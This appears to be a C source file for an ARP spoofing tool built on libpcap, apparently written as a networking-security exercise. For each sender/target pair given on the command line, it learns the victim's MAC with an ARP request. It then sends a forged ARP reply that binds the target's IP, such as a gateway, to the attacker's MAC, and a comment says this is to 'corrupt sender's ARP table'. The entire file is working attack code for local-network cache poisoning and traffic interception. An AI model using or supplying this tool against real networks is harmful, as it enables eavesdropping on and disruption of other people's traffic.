#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>

typedef struct {
    uint8_t dmac[6];
    uint8_t smac[6];
    uint16_t type;
} eth_header;

typedef struct {
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_size;
    uint8_t protocol_size;
    uint16_t opcode;
    uint8_t smac[6];
    uint8_t sip[4];
    uint8_t tmac[6];
    uint8_t tip[4];
} arp_header;

typedef struct {
    eth_header eth;
    arp_header arp;
} arp_packet;

uint8_t my_ip[4];
uint8_t my_mac[6];

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
}

void get_my_info(char *dev) { // get attacker's ip and mac
    struct ifreq my_info;
    int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(my_info.ifr_name, dev);
    ioctl(sock, SIOCGIFHWADDR, &my_info);
    for (int i = 0; i < 6; i++) {
        my_mac[i] = (unsigned char) my_info.ifr_ifru.ifru_hwaddr.sa_data[i];
    }

    ioctl(sock, SIOCGIFADDR, &my_info);
    for (int i = 2; i < 6; i++) {
        my_ip[i - 2] = (unsigned char)my_info.ifr_ifru.ifru_addr.sa_data[i];
    }
    
    close(sock);
}

void ip(char* ip_str, uint8_t ip[4]) { // "aaa.bbb.ccc.ddd" -> {aaa, bbb, ccc, ddd}
    char* ptr = ip_str;
    for (int i = 0; i < 4; i++) {
        ip[i] = atoi(ptr);
        ptr = strchr(ptr, '.') + 1;
    }
}

void print_ip(uint8_t *ip) {
    for (int i = 0; i < 4; i++) {
        printf("%d", ip[i]);
        if (i != 3) printf(".");
    }
    printf("\n");
}

void print_mac(char *mac) {
    for (int i = 0; i < 6; i++) {
        printf("%02x", (unsigned char)mac[i]);
        if (i != 5) printf(":");
    }
    printf("\n");
}

int send_arp_packet(pcap_t *handle, uint8_t *eth_smac, uint8_t *eth_dmac, uint8_t *arp_smac, uint8_t *arp_sip, uint8_t *arp_tmac, uint8_t *arp_tip, uint16_t opcode) {
    eth_header eth;
    arp_header arp;

    memcpy(eth.dmac, eth_dmac, 6);
    memcpy(eth.smac, eth_smac, 6);
    eth.type = htons(ETHERTYPE_ARP);

    arp.hardware_type = htons(ARPHRD_ETHER);
    arp.protocol_type = htons(ETHERTYPE_IP);
    arp.hardware_size = 6;
    arp.protocol_size = 4;
    arp.opcode = htons(opcode);
    memcpy(arp.smac, arp_smac, 6);
    memcpy(arp.sip, arp_sip, 4);
    memcpy(arp.tmac, arp_tmac, 6);
    memcpy(arp.tip, arp_tip, 4);

    arp_packet packet = {eth, arp};

    return pcap_sendpacket(handle, (const u_char*)&packet, sizeof(arp_packet));
}

int packet_arp_check(const u_char *ptr) {
    arp_packet *packet = (arp_packet *)ptr;

    if (packet->eth.type != htons(ETHERTYPE_ARP)) return 0;
    if (packet->arp.hardware_type != htons(ARPHRD_ETHER)) return 0;
    if (packet->arp.protocol_type != htons(ETHERTYPE_IP)) return 0;
    if (packet->arp.opcode != htons(ARPOP_REPLY)) return 0;

    return 1;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    int flow = argc / 2 - 1; // the number of attack flows
    
    char* dev = argv[1];
    get_my_info(dev);

    for (int i = 0; i < flow; i++) {
        uint8_t sender_ip[4];
        uint8_t target_ip[4];
        ip(argv[i * 2 + 2], sender_ip);
        ip(argv[i * 2 + 3], target_ip);

	    char errbuf[PCAP_ERRBUF_SIZE];
	    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	    if (handle == NULL) {
		    fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		    return -1;
        }

        // ARP request (get sender_mac)
        uint8_t broadcast_dmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
        uint8_t arp_request_tmac[6] = { 0, };

        int res = send_arp_packet(handle, my_mac, broadcast_dmac, my_mac, my_ip, arp_request_tmac, sender_ip, ARPOP_REQUEST);
        if (res != 0)
		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));

        const u_char* packet;
        while (1) {
            struct pcap_pkthdr* header;
            res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }
            if (packet_arp_check(packet) == 1) break;
        }

        arp_packet *arp_packet = packet;
        uint8_t sender_mac[6] = { 0, };
        memcpy(sender_mac, arp_packet->eth.smac, 6);

        // ARP reply (corrupt sender's ARP table)
        res = send_arp_packet(handle, my_mac, sender_mac, my_mac, target_ip, sender_mac, sender_ip, ARPOP_REPLY);
        if (res != 0)
		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    return 0;
}